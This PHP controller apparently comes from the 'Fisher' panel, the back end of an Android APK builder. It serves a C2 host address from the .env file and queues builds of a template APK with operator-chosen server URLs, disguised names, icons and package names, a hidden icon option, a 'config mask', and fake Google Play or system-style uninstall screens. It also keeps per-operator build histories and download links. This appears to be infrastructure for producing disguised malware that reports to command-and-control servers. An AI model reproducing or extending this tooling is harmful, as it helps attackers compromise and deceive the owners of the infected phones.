<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;
use think\facade\Env;

class ApkController extends BaseController
{
    // APK 输出目录（构建好的 APK 放这里）
    private string $apkOutDir = '/var/www/cs/runtime/apk_output';
    // APK 源文件和打包脚本都在 extend 目录
    private string $apkSrc = '/var/www/cs/extend/source.apk';

    private function rs(): string
    {
        return substr(md5(uniqid(mt_rand(), true)), 0, 8);
    }

    // 打包状态（内存缓存，实际用 settings 表持久化）
    private function getBuildState(): array
    {
        // 优先检查 bat 异步写入的状态文件
        $statusFile = runtime_path() . 'apk_build_status.json';
        if (file_exists($statusFile)) {
            $fileState = @json_decode(file_get_contents($statusFile), true);
            if (is_array($fileState) && isset($fileState['is_building']) && !$fileState['is_building']) {
                // 异步构建完成，同步到数据库
                $merged = array_merge($this->defaultState(), $fileState);
                $this->saveBuildState($merged);
                @unlink($statusFile);
                return $merged;
            }
        }
        $state = Db::table('fisher_settings')->where('key', 'apk_build_state')->value('value');
        if ($state) {
            $decoded = json_decode($state, true);
            if (is_array($decoded)) {
                // 如果 is_building=true，检查是否需要自动重置
                if (!empty($decoded['is_building'])) {
                    $taskFile = runtime_path() . 'apk_build_task.json';
                    $logFile = runtime_path() . 'apk_build.log';
                    // 任务文件已不存在（被Node.js读取）且超过2分钟 → 视为完成或超时
                    $startedAt = (int)($decoded['_start_time'] ?? 0);
                    $isStale = $startedAt > 0 && (time() - $startedAt) > 600;
                    $shouldReset = $isStale;
                    if (!$shouldReset && !file_exists($taskFile)) {
                        // 检查状态文件是否有完成标记
                        $statusFile = runtime_path() . 'apk_build_status.json';
                        if (file_exists($statusFile)) {
                            $shouldReset = true; // 有状态文件说明已完成
                        } elseif (file_exists($logFile) && time() - filemtime($logFile) > 120) {
                            $shouldReset = true; // 日志超过2分钟没更新
                        } elseif (!file_exists($logFile) && time() - ($decoded['_start_time'] ?? time()) > 120) {
                            $shouldReset = true; // 无日志文件且超过2分钟
                        }
                    }
                    if ($shouldReset) {
                        $decoded['is_building'] = false;
                        $decoded['progress'] = 0;
                        $decoded['message'] = '构建超时，已自动释放锁';
                        $decoded['logs'] = array_merge($decoded['logs'] ?? [], ['[' . date('H:i:s') . '] 构建超时，自动释放锁']);
                        $this->saveBuildState($decoded);
                    }
                }
                return array_merge($this->defaultState(), $decoded);
            }
        }
        return $this->defaultState();
    }

    private function saveBuildState(array $state): void
    {
        $json = json_encode($state, JSON_UNESCAPED_UNICODE);
        $exists = Db::table('fisher_settings')->where('key', 'apk_build_state')->find();
        if ($exists) {
            Db::table('fisher_settings')->where('key', 'apk_build_state')->update(['value' => $json]);
        } else {
            Db::table('fisher_settings')->insert(['key' => 'apk_build_state', 'value' => $json]);
        }
    }

    private function defaultState(): array
    {
        return [
            'is_building'   => false,
            'progress'      => 0,
            'message'       => '',
            'last_build_at' => '',
            'last_output'   => '',
            'logs'          => [],
        ];
    }

    /**
     * 直接读取项目 .env，绕开 ThinkPHP Env 缓存
     * 支持 KEY = value 格式，过滤 # 注释
     */
    private function readEnvVar(string $key): string
    {
        $envFile = root_path() . '.env';
        if (!is_file($envFile)) return '';
        $lines = @file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!$lines) return '';
        $key = strtoupper($key);
        foreach ($lines as $line) {
            $line = trim($line);
            if ($line === '' || $line[0] === '#') continue;
            $eqPos = strpos($line, '=');
            if ($eqPos === false) continue;
            $k = trim(substr($line, 0, $eqPos));
            if (strtoupper($k) !== $key) continue;
            $v = trim(substr($line, $eqPos + 1));
            // 去掉引号包裹
            if (strlen($v) >= 2) {
                $first = $v[0];
                $last = $v[strlen($v) - 1];
                if (($first === '"' && $last === '"') || ($first === "'" && $last === "'")) {
                    $v = substr($v, 1, -1);
                }
            }
            return $v;
        }
        return '';
    }

    /**
     * GET /api/system/c2-host
     * 获取 C2 服务器地址（.env 中 C2_HOST 字段）
     * 前端 APK 构建页面点击"自动获取"时调用
     */
    public function c2Host()
    {
        // 直接读 .env 文本，不依赖 ThinkPHP Env 缓存
        $c2Host = trim($this->readEnvVar('C2_HOST'));
        // 兜底：用 EXTERNAL_HOST + EXTERNAL_PORT 拼接
        if ($c2Host === '') {
            $extHost = trim($this->readEnvVar('EXTERNAL_HOST'));
            $extPort = trim($this->readEnvVar('EXTERNAL_PORT'));
            if ($extHost && $extPort) {
                $c2Host = 'http://' . $extHost . ':' . $extPort;
            }
        }
        return json([
            'success' => true,
            'data' => [
                'c2_host' => $c2Host,
            ],
            'message' => 'success',
        ]);
    }

    /**
     * GET /api/apk/info
     * 获取源 APK 信息
     */
    public function apkInfo()
    {
        $region = Request::get('region', 'global');

        return json([
            'success' => true,
            'data' => [
                'region'       => $region,
                'regionLabel'  => $region === 'cn' ? '国内版' : '国外版',
                'packageName'  => 'com.grand.secure.gold',
                'versionName'  => '24.2.365',
                'versionCode'  => 240565,
                'appName'      => 'Fisher',
                'serverUrl'    => '',
                'webUrl'       => '',
                'ownerUsername' => '',
                'apkExists'    => file_exists($this->apkSrc),
                'templatePath' => $this->apkSrc,
            ],
            'message' => 'success',
        ]);
    }

    /**
     * POST /api/apk/build
     * 触发 APK 打包
     */
    public function apkBuild()
    {
        $state = $this->getBuildState();
        if ($state['is_building']) {
            return json(['success' => false, 'message' => '正在打包中，请稍后'], 409);
        }

        $data = Request::post();
        $serverUrl = $data['serverUrl'] ?? $data['server_url'] ?? '';
        $webUrl = $data['webUrl'] ?? $data['web_url'] ?? '';
        $appName = trim($data['appName'] ?? $data['app_name'] ?? 'Fisher');
        $ownerUsername = $data['ownerUsername'] ?? $data['owner_username'] ?? '';

        // 构建页面必须提交 multipart 表单和两个资源文件。旧逻辑在校验前就
        // 写入 is_building=true，异常请求会留下永久构建锁。
        $contentType = strtolower((string)($_SERVER['CONTENT_TYPE'] ?? ''));
        if (!str_starts_with($contentType, 'multipart/form-data')) {
            return json(['success' => false, 'message' => '构建请求格式错误，请从构建页面重新提交'], 400);
        }
        if (trim((string)$serverUrl) === '') {
            return json(['success' => false, 'message' => '服务器地址不能为空'], 400);
        }
        $iconUpload = request()->file('appIcon');
        $bgUpload = request()->file('backgroundImage');
        if (!$iconUpload || !$bgUpload) {
            return json(['success' => false, 'message' => '请同时上传应用图标和背景图'], 400);
        }
        if (method_exists($iconUpload, 'getError') && $iconUpload->getError()) {
            return json(['success' => false, 'message' => '应用图标上传失败'], 400);
        }
        if (method_exists($bgUpload, 'getError') && $bgUpload->getError()) {
            return json(['success' => false, 'message' => '背景图上传失败'], 400);
        }

        // ★ 校验应用名格式
        $nameError = $this->validateAppName($appName);
        if ($nameError) {
            return json(['success' => false, 'message' => $nameError], 400);
        }

        // ★ 校验应用名是否被其他用户占用（superadmin 不受限）
        $user = request()->user ?? [];
        $role = $user['role'] ?? '';
        $currentUsername = $user['username'] ?? '';
        if ($ownerUsername && !in_array($role, ['superadmin', 'super-admin'])) {
            $existing = Db::table('fisher_app_owner_map')->where('app_name', $appName)->find();
            if ($existing && $existing['owner_username'] !== $ownerUsername) {
                return json(['success' => false, 'message' => "应用名 \"{$appName}\" 已被用户 {$existing['owner_username']} 使用"], 409);
            }
        }

        $prefix = strtoupper(substr(preg_replace('/[^a-zA-Z]/', '', $appName ?: 'GNI'), 0, 3)) ?: 'GNI';
        $outputFilename = $prefix . '_' . date('Ymd_His') . '.apk';

        // 设置打包状态
        $state['is_building'] = true;
        $state['progress'] = 10;
        $state['message'] = '开始打包...';
        $state['logs'] = ['[' . date('H:i:s') . '] 开始打包 ' . $appName];
        $state['_start_time'] = time();
        $state['_output_filename'] = $outputFilename;
        $this->saveBuildState($state);

        $buildQueued = false;
        $buildId = 0;
        register_shutdown_function(function () use (&$buildQueued, &$buildId, $state) {
            if ($buildQueued) return;
            $failedState = $state;
            $failedState['is_building'] = false;
            $failedState['progress'] = 0;
            $failedState['message'] = '构建请求异常终止，已自动释放锁';
            $failedState['logs'] = array_merge($failedState['logs'] ?? [], ['[' . date('H:i:s') . '] 请求异常终止，自动释放锁']);
            try {
                $this->saveBuildState($failedState);
                if ($buildId > 0) {
                    Db::table('fisher_apk_builds')->where('id', $buildId)->update(['status' => 'failed']);
                }
            } catch (\Throwable $ignored) {
            }
        });

        try {
        // 创建输出目录
        if (!is_dir($this->apkOutDir)) {
            mkdir($this->apkOutDir, 0755, true);
        }

        // 使用 Python build_apk.py 执行打包（异步）
        $pythonScript = '/var/www/cs/extend/build_apk.py';
        $outputPath = $this->apkOutDir . '/' . $outputFilename;
        $packageName = $data['packageName'] ?? $data['package_name'] ?? '';
        $pageStyleConfig = $data['pageStyleConfig'] ?? '';
        $loadingTips = $data['loadingTips'] ?? '';
        $configMaskText = $data['configMaskText'] ?? '';
        $configMaskSubtitle = $data['configMaskSubtitle'] ?? '';
        $enableConfigMask = $data['enableConfigMask'] ?? '1';
        $showAppIcon = $data['showAppIcon'] ?? '1';
        $uninstallMode = $data['uninstallMode'] ?? '0';
        $uninstallStyle = $data['uninstallStyle'] ?? $data['uninstall_style'] ?? 'googleplay';
        if (!in_array($uninstallStyle, ['googleplay', 'system'], true)) {
            $uninstallStyle = 'googleplay';
        }
        $enableServiceMode = $data['enableServiceMode'] ?? '0';

        // 构建完整的 pageStyleConfig JSON（传给 --config 参数）
        $psc = [];
        if ($pageStyleConfig) {
            $psc = is_string($pageStyleConfig) ? json_decode($pageStyleConfig, true) ?: [] : $pageStyleConfig;
        }
        $psc['_configMaskText'] = $configMaskText ?: ($psc['_configMaskText'] ?? '');
        $psc['_configMaskSubtitle'] = $configMaskSubtitle ?: ($psc['_configMaskSubtitle'] ?? '');
        $psc['_enableConfigMask'] = $enableConfigMask === '1' ? 'true' : 'false';
        $psc['_showAppIcon'] = $showAppIcon === '1' ? 'true' : 'false';
        $psc['_uninstallMode'] = $uninstallMode === '1' ? 'true' : 'false';
        $psc['_uninstallStyle'] = $uninstallStyle;
        $psc['_enableServiceMode'] = $enableServiceMode === '1' ? 'true' : 'false';
        if ($loadingTips) {
            $psc['_loadingTips'] = $loadingTips;
        }
        // ★ 把 ownerUsername 传给 Python 打包脚本
        $ownerUsername = $data['ownerUsername'] ?? $data['owner_username'] ?? '';
        if ($ownerUsername) {
            $psc['_ownerUsername'] = $ownerUsername;
        }

        // 处理上传图标 - 保存到持久目录 runtime/apk_assets/
        $assetsDir = runtime_path() . 'apk_assets' . DIRECTORY_SEPARATOR;
        if (!is_dir($assetsDir)) {
            mkdir($assetsDir, 0755, true);
        }
        $iconPath = '';
        $bgPath = '';
        $persistIconPath = '';
        $persistBgPath = '';

        // ===== DEBUG: 记录文件上传信息 =====
        $debugLog = runtime_path() . 'apk_upload_debug.log';
        $debugInfo = date('Y-m-d H:i:s') . " === APK BUILD REQUEST ===\n";
        $debugInfo .= "  _FILES: " . json_encode($_FILES, JSON_UNESCAPED_UNICODE) . "\n";
        $debugInfo .= "  Content-Type: " . ($_SERVER['CONTENT_TYPE'] ?? 'N/A') . "\n";
        $debugInfo .= "  Content-Length: " . ($_SERVER['CONTENT_LENGTH'] ?? 'N/A') . "\n";
        $debugInfo .= "  appName: " . ($data['appName'] ?? 'N/A') . "\n";
        $debugInfo .= "  serverUrl: " . ($data['serverUrl'] ?? 'N/A') . "\n";
        $debugInfo .= "  request()->file('appIcon'): " . (request()->file('appIcon') ? 'EXISTS' : 'NULL') . "\n";
        $debugInfo .= "  request()->file('backgroundImage'): " . (request()->file('backgroundImage') ? 'EXISTS' : 'NULL') . "\n";
        file_put_contents($debugLog, $debugInfo, FILE_APPEND);
        // ===== END DEBUG =====

        try {
            if (request()->file('appIcon')) {
                $icon = request()->file('appIcon');
                $tmpPath = $icon->getRealPath() ?: $icon->getPathname();
                $iconPath = runtime_path() . 'apk_icon_' . time() . '.png';
                $persistIconPath = $assetsDir . 'icon_' . date('Ymd_His') . '_' . $this->rs() . '.png';
                if ($tmpPath && file_exists($tmpPath)) {
                    copy($tmpPath, $iconPath);
                    copy($tmpPath, $persistIconPath);
                    file_put_contents($debugLog, "  ICON SAVED: $iconPath (size=" . filesize($iconPath) . ")\n", FILE_APPEND);
                } else {
                    $iconPath = '';
                    $persistIconPath = '';
                    file_put_contents($debugLog, "  ICON FAILED: tmpPath=$tmpPath not exists\n", FILE_APPEND);
                }
            } else {
                file_put_contents($debugLog, "  ICON: not uploaded (file() returned null)\n", FILE_APPEND);
            }
        } catch (\Throwable $e) {
            $iconPath = '';
            $persistIconPath = '';
            file_put_contents($debugLog, "  ICON EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
        }
        try {
            if (request()->file('backgroundImage')) {
                $bg = request()->file('backgroundImage');
                $tmpPath = $bg->getRealPath() ?: $bg->getPathname();
                $bgPath = runtime_path() . 'apk_bg_' . time() . '.png';
                $persistBgPath = $assetsDir . 'bg_' . date('Ymd_His') . '_' . $this->rs() . '.png';
                if ($tmpPath && file_exists($tmpPath)) {
                    copy($tmpPath, $bgPath);
                    copy($tmpPath, $persistBgPath);
                    file_put_contents($debugLog, "  BG SAVED: $bgPath (size=" . filesize($bgPath) . ")\n", FILE_APPEND);
                } else {
                    $bgPath = '';
                    $persistBgPath = '';
                    file_put_contents($debugLog, "  BG FAILED: tmpPath=$tmpPath not exists\n", FILE_APPEND);
                }
            } else {
                file_put_contents($debugLog, "  BG: not uploaded (file() returned null)\n", FILE_APPEND);
            }
        } catch (\Throwable $e) {
            $bgPath = '';
            $persistBgPath = '';
            file_put_contents($debugLog, "  BG EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
        }

        // 加密构建已下线。即使旧前端或手工请求仍提交 encrypt=1，也只执行普通构建。
        $encrypt = false;

        // 写任务文件让独立进程执行（不在 PHP-CGI 中调用命令）
        $taskFile = runtime_path() . 'apk_build_task.json';
        $taskJson = json_encode([
            'pythonScript'    => $pythonScript,
            'serverUrl'       => $serverUrl,
            'webUrl'          => $webUrl,
            'appName'         => $appName,
            'packageName'     => $packageName,
            'outputPath'      => $outputPath,
            'outputFilename'  => $outputFilename,
            'config'          => json_encode($psc, JSON_UNESCAPED_UNICODE),
            'iconPath'        => $iconPath,
            'bgPath'          => $bgPath,
            'encrypt'         => $encrypt ? true : false,
            'createdAt'       => time(),
        ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        if ($taskJson === false || file_put_contents($taskFile, $taskJson, LOCK_EX) === false) {
            throw new \RuntimeException('无法写入 APK 构建任务文件');
        }

        // 记录到数据库
        // 注意：$ownerUsername 已在上面定义
        $buildId = Db::table('fisher_apk_builds')->insertGetId([
            'filename'       => $outputFilename,
            'server_url'     => $serverUrl,
            'web_url'        => $webUrl,
            'app_name'       => $appName,
            'status'         => 'building',
            'owner_username' => $ownerUsername,
            'created_at'     => time(),
        ]);

        // ★ 写入应用名→owner 映射（仅当有 owner 时）
        if ($appName && $ownerUsername) {
            $existing = Db::table('fisher_app_owner_map')->where('app_name', $appName)->find();
            if ($existing) {
                Db::table('fisher_app_owner_map')->where('app_name', $appName)->update([
                    'owner_username' => $ownerUsername,
                    'updated_at' => date('Y-m-d H:i:s'),
                ]);
            } else {
                Db::table('fisher_app_owner_map')->insert([
                    'app_name' => $appName,
                    'owner_username' => $ownerUsername,
                    'created_at' => date('Y-m-d H:i:s'),
                    'updated_at' => date('Y-m-d H:i:s'),
                ]);
            }
        }


        // 保存完整配置到 fisher_apk_build_configs（用于重构）
        $versionName = $data['versionName'] ?? $data['version_name'] ?? '';
        $uninstallOverlayTexts = $data['uninstallOverlayTexts'] ?? $data['uninstall_overlay_texts'] ?? '';
        Db::table('fisher_apk_build_configs')->insert([
            'build_id'              => $buildId,
            'filename'              => $outputFilename,
            'server_url'            => $serverUrl,
            'web_url'               => $webUrl,
            'app_name'              => $appName,
            'package_name'          => $packageName,
            'version_name'          => $versionName,
            'enable_config_mask'    => ($enableConfigMask === '1') ? 1 : 0,
            'enable_service_mode'   => ($enableServiceMode === '1') ? 1 : 0,
            'show_app_icon'         => ($showAppIcon === '1') ? 1 : 0,
            'uninstall_mode'        => ($uninstallMode === '1') ? 1 : 0,
            'uninstall_style'       => $uninstallStyle,
            'config_mask_text'      => $configMaskText,
            'config_mask_subtitle'  => $configMaskSubtitle,
            'page_style_config'     => is_string($pageStyleConfig) ? $pageStyleConfig : json_encode($pageStyleConfig, JSON_UNESCAPED_UNICODE),
            'loading_tips'          => is_string($loadingTips) ? $loadingTips : json_encode($loadingTips, JSON_UNESCAPED_UNICODE),
            'uninstall_overlay_texts' => is_string($uninstallOverlayTexts) ? $uninstallOverlayTexts : json_encode($uninstallOverlayTexts, JSON_UNESCAPED_UNICODE),
            'icon_path'             => $persistIconPath,
            'bg_path'               => $persistBgPath,
            'owner_username'        => $ownerUsername,
            'created_at'            => date('Y-m-d H:i:s'),
        ]);

        $buildQueued = true;
        return json([
            'success' => true,
            'data' => [
                'filename' => $outputFilename,
                'buildId'  => $buildId,
                'status'   => 'building',
            ],
            'message' => '打包已开始',
        ]);
        } catch (\Throwable $e) {
            // 任何 PHP 异常都必须释放构建锁，避免后续请求永久返回“正在打包中”。
            $state['is_building'] = false;
            $state['progress'] = 0;
            $state['message'] = '构建任务创建失败: ' . $e->getMessage();
            $state['logs'] = array_merge($state['logs'] ?? [], ['[' . date('H:i:s') . '] 任务创建失败: ' . $e->getMessage()]);
            try {
                $this->saveBuildState($state);
            } catch (\Throwable $ignored) {
                // 状态写入失败时仍返回明确错误，由外部监控发现。
            }
            error_log('[APK Build] task creation failed: ' . $e->getMessage());
            return json(['success' => false, 'message' => '构建任务创建失败，请查看服务器日志'], 500);
        }
    }

    /**
     * GET /api/apk/build-status
     * 获取打包状态
     */
    public function apkBuildStatus()
    {
        $state = $this->getBuildState();

        // 检查最新的打包记录是否已完成
        $latest = Db::table('fisher_apk_builds')->order('created_at', 'desc')->find();
        if ($latest && $latest['status'] === 'building') {
            $outputPath = $this->apkOutDir . '/' . $latest['filename'];
            if (file_exists($outputPath)) {
                // 打包完成
                $fileSize = filesize($outputPath);
                Db::table('fisher_apk_builds')->where('id', $latest['id'])->update([
                    'status'    => 'done',
                    'file_size' => $fileSize,
                ]);
                $state['is_building'] = false;
                $state['progress'] = 100;
                $state['message'] = '打包完成';
                $state['last_build_at'] = date('Y-m-d H:i:s');
                $state['last_output'] = $latest['filename'];
                $this->saveBuildState($state);
            }
        }

        return json([
            'success'     => true,
            'isBuilding'  => $state['is_building'],
            'is_building' => $state['is_building'],
            'progress'    => $state['progress'],
            'message'     => $state['message'],
            'lastBuildAt' => $state['last_build_at'],
            'lastOutput'  => $state['last_output'],
        ]);
    }

    /**
     * GET /api/apk/build-logs
     * 获取打包日志
     */
    public function apkBuildLogs()
    {
        $state = $this->getBuildState();
        return json(['success' => true, 'logs' => $state['logs'] ?? []]);
    }

    /**
     * GET /api/apk/build-history
     * 打包历史
     */
    public function apkBuildHistory()
    {
        $rows = Db::table('fisher_apk_builds')->order('created_at', 'desc')->limit(50)->select()->toArray();

        $records = [];
        foreach ($rows as $r) {
            $records[] = [
                'id'          => $r['id'],
                'fileName'    => $r['filename'],
                'filename'    => $r['filename'],
                'serverUrl'   => $r['server_url'] ?? '',
                'webUrl'      => $r['web_url'] ?? '',
                'appName'     => $r['app_name'] ?? '',
                'fileSize'    => $r['file_size'] ?? 0,
                'status'      => $r['status'] ?? 'done',
                'createdAt'   => ($r['created_at'] ?? 0) * 1000,
                'downloadUrl' => '/api/apk/download/' . ($r['filename'] ?? ''),
            ];
        }

        return json(['success' => true, 'records' => $records]);
    }

    /**
     * GET /api/apk/list
     * APK 列表
     */
    public function apkList()
    {
        $user = request()->user ?? [];
        $role = $user['role'] ?? '';
        $username = $user['username'] ?? '';

        $query = Db::table('fisher_apk_builds');

        // 普通账号只能看到自己打包的记录
        if ($role !== 'superadmin' && $role !== 'super-admin' && $username) {
            $query = $query->where('owner_username', $username);
        }

        $rows = $query->order('created_at', 'desc')->limit(50)->select()->toArray();

        $list = [];
        foreach ($rows as $r) {
            $filePath = $this->apkOutDir . '/' . $r['filename'];
            $list[] = [
                'id'             => $r['id'],
                'build_id'       => $r['id'],
                'filename'       => $r['filename'],
                'server_url'     => $r['server_url'] ?? '',
                'serverUrl'      => $r['server_url'] ?? '',
                'web_url'        => $r['web_url'] ?? '',
                'webUrl'         => $r['web_url'] ?? '',
                'app_name'       => $r['app_name'] ?? '',
                'appName'        => $r['app_name'] ?? '',
                'size'           => (int)($r['file_size'] ?? 0),
                'file_size'      => (int)($r['file_size'] ?? 0),
                'status'         => $r['status'] ?? 'done',
                'created_at'     => ($r['created_at'] ?? 0) * 1000,
                'time'           => ($r['created_at'] ?? 0) * 1000,
                'download_url'   => '/api/apk/download?filename=' . urlencode($r['filename']),
                'owner_username' => $r['owner_username'] ?? '',
                'exists'         => file_exists($filePath),
            ];
        }

        return json(['success' => true, 'data' => $list, 'message' => 'success']);
    }

    /**
     * GET /api/apk/download
     * GET /api/apk/download/:filename
     * 下载 APK
     */
    public function apkDownload()
    {
        $filename = Request::get('filename', '');
        return $this->doDownload($filename);
    }

    public function apkDownloadFile($filename)
    {
        return $this->doDownload($filename);
    }

    private function doDownload(string $filename)
    {
        if (!$filename) {
            return json(['success' => false, 'message' => 'filename required'], 400);
        }

        $safe = basename($filename);
        $full = $this->apkOutDir . '/' . $safe;

        if (!file_exists($full)) {
            return json(['success' => false, 'message' => '文件不存在'], 404);
        }

        return download($full, $safe);
    }

    /**
     * DELETE /api/apk/delete
     * 删除 APK
     */
    public function apkDelete()
    {
        $filename = Request::get('filename', '') ?: (Request::post('filename') ?? '');
        if (!$filename) {
            return json(['success' => false, 'message' => 'filename required'], 400);
        }

        // 权限检查：普通账号只能删除自己的 APK
        $user = request()->user ?? [];
        $role = $user['role'] ?? '';
        $username = $user['username'] ?? '';
        if ($role !== 'superadmin' && $role !== 'super-admin' && $username) {
            $record = Db::table('fisher_apk_builds')->where('filename', $filename)->find();
            if ($record && ($record['owner_username'] ?? '') !== $username) {
                return json(['success' => false, 'message' => '无权删除此记录'], 403);
            }
        }

        Db::table('fisher_apk_builds')->where('filename', $filename)->delete();

        $filePath = $this->apkOutDir . '/' . basename($filename);
        if (file_exists($filePath)) {
            @unlink($filePath);
        }
        $idsig = $filePath . '.idsig';
        if (file_exists($idsig)) {
            @unlink($idsig);
        }

        return json(['success' => true, 'data' => null, 'message' => 'deleted']);
    }

    // ==================== 部署测试 ====================

    /**
     * POST /api/apk/bt-deploy-test
     */
    public function btDeployTest()
    {
        return json(['success' => true, 'data' => ['status' => 'ok'], 'message' => 'success']);
    }

    /**
     * POST /api/apk/cdn-test
     */
    public function cdnTest()
    {
        return json(['success' => true, 'data' => ['status' => 'ok'], 'message' => 'success']);
    }

    // ==================== 配置 ====================

    /**
     * GET|POST /api/apk/cdn-config
     */
    public function cdnConfig()
    {
        if (Request::isPost()) {
            $data = Request::post();
            Db::table('fisher_settings')->replace(['key' => 'cdn_config', 'value' => json_encode($data, JSON_UNESCAPED_UNICODE)]);
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }
        $row = Db::table('fisher_settings')->where('key', 'cdn_config')->find();
        $config = $row ? json_decode($row['value'], true) : [];
        return json(['success' => true, 'data' => $config ?: (object)[], 'message' => 'success']);
    }

    /**
     * GET|POST /api/apk/bt-deploy-config
     */
    public function btDeployConfig()
    {
        if (Request::isPost()) {
            $data = Request::post();
            Db::table('fisher_settings')->replace(['key' => 'bt_deploy_config', 'value' => json_encode($data, JSON_UNESCAPED_UNICODE)]);
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }
        $row = Db::table('fisher_settings')->where('key', 'bt_deploy_config')->find();
        $config = $row ? json_decode($row['value'], true) : [];
        return json(['success' => true, 'data' => $config ?: (object)[], 'message' => 'success']);
    }

    // ==================== Auto Build ====================

    /**
     * GET|POST /api/apk/auto-build/config
     */
    public function autoBuildConfig()
    {
        if (Request::isPost()) {
            $data = Request::post();
            Db::table('fisher_settings')->replace(['key' => 'auto_build_config', 'value' => json_encode($data, JSON_UNESCAPED_UNICODE)]);
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }
        $row = Db::table('fisher_settings')->where('key', 'auto_build_config')->find();
        $config = $row ? json_decode($row['value'], true) : [];
        return json(['success' => true, 'data' => $config ?: (object)[], 'message' => 'success']);
    }

    /**
     * GET|POST /api/apk/auto-build/targets
     */
    public function autoBuildTargets()
    {
        if (Request::isPost()) {
            $data = Request::post();
            $row = Db::table('fisher_settings')->where('key', 'auto_build_targets')->find();
            $targets = $row ? json_decode($row['value'], true) : [];
            $data['id'] = uniqid('target-');
            $targets[] = $data;
            Db::table('fisher_settings')->replace(['key' => 'auto_build_targets', 'value' => json_encode($targets, JSON_UNESCAPED_UNICODE)]);
            return json(['success' => true, 'data' => $data, 'message' => 'success']);
        }
        $row = Db::table('fisher_settings')->where('key', 'auto_build_targets')->find();
        $targets = $row ? json_decode($row['value'], true) : [];
        return json(['success' => true, 'data' => $targets, 'message' => 'success']);
    }

    /**
     * DELETE /api/apk/auto-build/targets/:targetId
     */
    public function autoBuildTargetDelete($targetId)
    {
        $row = Db::table('fisher_settings')->where('key', 'auto_build_targets')->find();
        $targets = $row ? json_decode($row['value'], true) : [];
        $targets = array_filter($targets, function ($t) use ($targetId) {
            return ($t['id'] ?? '') !== $targetId;
        });
        Db::table('fisher_settings')->replace(['key' => 'auto_build_targets', 'value' => json_encode(array_values($targets), JSON_UNESCAPED_UNICODE)]);
        return json(['success' => true, 'data' => null, 'message' => 'deleted']);
    }

    /**
     * GET /api/ab-apk/latest-info
     */
    public function latestInfo()
    {
        $row = Db::table('fisher_apk_builds')->order('id', 'desc')->find();
        if (!$row) {
            return json(['success' => true, 'data' => null, 'message' => 'No builds']);
        }
        return json(['success' => true, 'data' => [
            'filename' => $row['filename'] ?? '',
            'size' => $row['size'] ?? 0,
            'created_at' => $row['created_at'] ?? '',
        ], 'message' => 'success']);
    }

    /**
     * GET /api/apk/build-config/:buildId
     * 获取某次打包的完整配置（用于重构）
     */
    public function getBuildConfig($buildId)
    {
        $row = Db::table('fisher_apk_build_configs')->where('build_id', $buildId)->find();
        if (!$row) {
            return json(['success' => false, 'message' => '未找到该构建配置'], 404);
        }

        // 检查图标/背景图文件是否存在
        $iconExists = !empty($row['icon_path']) && file_exists($row['icon_path']);
        $bgExists = !empty($row['bg_path']) && file_exists($row['bg_path']);

        return json([
            'success' => true,
            'data' => [
                'build_id'              => (int)$row['build_id'],
                'filename'              => $row['filename'] ?? '',
                'server_url'            => $row['server_url'] ?? '',
                'web_url'               => $row['web_url'] ?? '',
                'app_name'              => $row['app_name'] ?? '',
                'package_name'          => $row['package_name'] ?? '',
                'version_name'          => $row['version_name'] ?? '',
                'enable_config_mask'    => (bool)$row['enable_config_mask'],
                'enable_service_mode'   => (bool)$row['enable_service_mode'],
                'show_app_icon'         => (bool)$row['show_app_icon'],
                'uninstall_mode'        => (bool)$row['uninstall_mode'],
                'uninstall_style'       => $row['uninstall_style'] ?? '',
                'config_mask_text'      => $row['config_mask_text'] ?? '',
                'config_mask_subtitle'  => $row['config_mask_subtitle'] ?? '',
                'page_style_config'     => $row['page_style_config'] ?? '',
                'loading_tips'          => $row['loading_tips'] ?? '',
                'uninstall_overlay_texts' => $row['uninstall_overlay_texts'] ?? '',
                'icon_path'             => $row['icon_path'] ?? '',
                'bg_path'               => $row['bg_path'] ?? '',
                'icon_exists'           => $iconExists,
                'bg_exists'             => $bgExists,
                'owner_username'        => $row['owner_username'] ?? '',
                'created_at'            => $row['created_at'] ?? '',
            ],
            'message' => 'success',
        ]);
    }

    /**
     * GET /api/apk/check-name?name=xxx
     * 检查应用名是否可用（是否被其他用户占用）
     */
    public function checkAppName()
    {
        $name = trim(Request::get('name', ''));
        $user = request()->user ?? [];
        $username = $user['username'] ?? '';
        $role = $user['role'] ?? '';

        // 校验格式
        $error = $this->validateAppName($name);
        if ($error) {
            return json(['success' => false, 'available' => false, 'message' => $error], 400);
        }

        // superadmin 不受限制
        if (in_array($role, ['superadmin', 'super-admin'])) {
            return json(['success' => true, 'available' => true, 'message' => '可用']);
        }

        // 查映射表
        $existing = Db::table('fisher_app_owner_map')->where('app_name', $name)->find();
        if ($existing && $existing['owner_username'] !== $username) {
            return json(['success' => true, 'available' => false, 'message' => '该应用名不合法，请修改之后重试']);
        }

        return json(['success' => true, 'available' => true, 'message' => '可用']);
    }

    /**
     * 校验应用名格式
     */
    private function validateAppName(string $name): ?string
    {
        if (!$name) return '应用名不能为空';
        if (mb_strlen($name) < 2) return '应用名至少2个字符';
        if (mb_strlen($name) > 20) return '应用名最多20个字符';
        if (preg_match('/[|\\\\\/\<\>]/', $name)) return '应用名不能包含特殊字符 | \\ / < >';
        if (preg_match('/\s{2,}/', $name)) return '应用名不能包含连续空格';
        return null;
    }
}
